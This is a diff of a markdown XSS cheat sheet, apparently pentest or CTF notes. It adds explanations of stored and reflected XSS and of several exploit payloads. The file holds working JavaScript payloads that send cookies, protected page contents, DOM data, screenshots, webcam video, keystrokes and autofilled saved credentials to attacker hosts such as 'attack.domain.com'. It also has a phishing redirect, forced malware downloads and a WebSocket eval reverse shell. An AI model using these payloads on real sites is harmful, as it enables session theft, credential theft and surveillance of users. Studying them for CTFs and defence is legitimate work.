@@ -2,6 +2,20 @@
 
 Cross Site Scripting or XXS vulnerabilities arise when user controlled data is injected into the DOM in such a way that it is interpreted as JavaScript by the parser resulting in its execution when rendered by the browser.
 
+## Types of XSS
+
+### Stored XSS
+
+Stored XSS variants are considered to be the most useful and powerful form of XSS vulnerabilities. This is because when exploited they typically require little to no interaction from a client accessing the affected web application other then them navigating to the injected page. Stored XSS vulnerabilities are refereed to as such because of the way they are stored by the web application backend and re-rendered in the clients browser on every reload of the affected page.
+
+The easiest way to visualise this is to think of a simple blogging website that allows you to post comments under a users blog. If the comments section is vulnerable to an XSS injection then an attacker may upload a XSS payload as a comment and submit it. Whenever another user visits the page and the comments section is loaded by the browser, which retrieves the comments from the web server, the injected XSS payload will trigger and affect the accessing clients browser.
+
+Stored XSS vulnerabilities can occur anytime user controlled information is unsafely proceeded and stored on the web application backend for later use in display of the data. This includes unusual places like uploaded file names and images.
+
+### Reflected XSS
+
+Reflected XSS variants are XSS vulnerabilities that are triggered under a certain 'self invoked' context on the affected web application. They are 'reflected' because they only affect the client that triggered this vulnerable state and are only valid/triggered from the lifetime of the browser session on that 'page'. An example would be clicking on a link to a web application page with a XSS payload as a URL parameter for a search bar which triggers when the page loads with that query because the query (search) text is shown on the page.
+
 ## Identification Payloads
 
 ### Polyglots
@@ -258,9 +272,11 @@ _These can be embeded with exiftool and hence an example command for doing so is
 
 ## Exploit Payloads
 
-JS code for embedding in exploit payloads.
+The following payloads can be used to turn a discovered XSS vulnerability into a more robust proof of concept or in the case of CTF like challenges extract desired data/information/cookies from a vulnerable web application.
 
 ### Phishing Redirect
+
+The following XSS payloads can be used to force a client to navigate to another page such as a fake cloned site controlled by the attacker or some other arbitrary place on the internet. Typically such behaviour is best combined with a stored XSS vector.
 
 ```javascript
 window.location = 'https://attackerphishingsite.com';
@@ -277,6 +293,8 @@ document.location = 'https://attackerphishingsite.com';
 ### Exfiltrate Auth Tokens/Cookies
 
 _For use with an [exfiltration/attack server](#exfiltration-servers)_
+
+Often a useful target for XSS exploits, in CTFs, are the authentication/session cookies of another user on the affected site particularly in the case of a stored XSS vulnerability. However with the advent of `secure` attributes on cookies which prevent JavaScript from being able to access cookies with `document` commands like `document.cookie` the goal of a XSS exploit has evolved. However the bellow are several payload variations that can be used when the `secure` attribute is not set of cookies to exfiltrate them out of band to a controlled web server endpoint.
 
 ```javascript
 fetch('attack.domain.com?cookie=${encodeURIComponent(document.cookie)}');
@@ -310,6 +328,8 @@ document.write(<img src="http://attack.svr?cookie=" + document.cookie>);
 
 ### Grab Protected Pages
 
+The following payloads aim to grab page data from the perspective of another target client such as an admin or privileged user whose session information may allow them to view pages the attacker does not have access to or to view page elements which are not shown to the attacker ordinarily.
+
 ```javascript
 fetch('/protected_page')
 	.then((page) => page.text())
@@ -326,33 +346,31 @@ fetch('/protected_page')
 javascript:fetch("https://victim.com/page").then(a => {a.text().then(b)=>fetch("http://example.com/?data="+btoa(b))})})
 ```
 
-### Grab Specific Page Data
+### Grab Specific DOM Elements
 
-_For use with an [exfiltration/attack server](#exfiltration-servers)_
-
-#### Page Area {div, span, etc}
+These payloads can be used to extract data from specific DOM elements and return their information to an attackers web server out of band.
 
 ```javascript
 fetch(
 	'attacker.domain.com?data=' +
 		encodeURIComponent(
-			document.querySelector('.hmtlClassElmentToSteal').textContent
+			document.querySelector('.hmtlClassElementToSteal').textContent
 		)
 );
 ```
 
-#### Input Field/Text Area
-
 ```javascript
 fetch(
 	'attacker.domain.com?data=' +
 		encodeURIComponent(
-			document.querySelector('.hmtlClassElmentToSteal').textValue
+			document.querySelector('.hmtlClassElementToSteal').textValue
 		)
 );
 ```
 
 ### Grab Screenshots
+
+This payload extracts a screenshot of the affected clients browser context at the time when the payload is triggered and exfiltrates it to the attackers web server.
 
 ```javascript
 <script src=https://html2canvas.hertzen.com/dist/html2canvas.min.js>
@@ -369,17 +387,13 @@ html2canvas(document.body)
 
 ### Forced Download
 
-_For use with an [exfiltration/attack server](#exfiltration-servers)_
-
-#### Macro Document
+These payloads take advantage of an XSS vulnerability to trigger a forced download of an attacker controlled file in the affected clients browser. This may be useful when attempting to get malware onto a targets system or to socially engineer the client.
 
 ```javascript
 frame = document.createElement('iframe');
 frame.src = 'attack.domain.com/payloadDocument.docx';
 document.body.appendChild(frame);
 ```
-
-#### Executable File
 
 ```javascript
 <a href=/executable.exe download=executable.exe onclick="if(window.el){return;}el=this;
@@ -397,7 +411,7 @@ document.body.appendChild(frame);
 
 ### Capture Data From Webcam
 
-_For use with an [exfiltration/attack server](#exfiltration-servers)_
+This payload is design to exploit a XSS vulnerability to capture data from an affected clients webcam.
 
 ```js
 vid_element = document.createElement('video')
@@ -422,7 +436,7 @@ navigator.mediaDevices.getUserMedia({video:true})
 
 ### Reverse Shell
 
-_For use with an [exfiltration/attack server](#exfiltration-servers)_
+This payload is designed to bind a web socket to an affected host allowing the attacker the potential to send commands to the target client.
 
 ```js
 sock = new WebSocket('wss://attack.domain.com');
@@ -431,7 +445,7 @@ sock.onmessage = (event) => eval(e.data);
 
 ### Run Keylogger
 
-_For use with an [exfiltration/attack server](#exfiltration-servers)_
+This payload attempts to steal an affected clients keystrokes and exfiltrate them to the attackers server.
 
 ```js
 document.addEventListener('change', element => {
@@ -445,6 +459,8 @@ document.addEventListener('change', element => {
 ```
 
 ### Steal Saved Browser Credentials
+
+This payload attempts to exploit the behaviour of saved browser credentials by creating a form to autofill on the fly with an XSS vector and harvesting the filled credentials to be sent over the network to the attackers server.
 
 ```js
 form = document.createElement('form');
